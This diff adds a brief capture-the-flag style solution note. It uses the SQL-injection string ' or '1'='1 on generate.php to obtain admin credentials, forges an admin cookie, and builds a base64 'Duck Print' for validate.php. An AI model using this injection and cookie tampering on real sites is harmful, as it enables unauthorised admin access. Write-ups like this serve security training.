@@ -1,0 +1,12 @@
+in generate.php got admin token from
+' or '1'='1
+
+we will got
+DuckDuckGoose:1:d4rkw1ng
+
+then change cookie to
+duck_cookie={"username":"DuckDuckGoose","admin":1}
+and go to page validate.php to check Duck Print
+
+Duck Print is sha265 of below string
+RHVja0R1Y2tHb29zZQ==.eyJ1c2VybmFtZSI6IkR1Y2tEdWNrR29vc2UiLCJhZG1pbiI6MX0=.ZDRya3cxbmc=
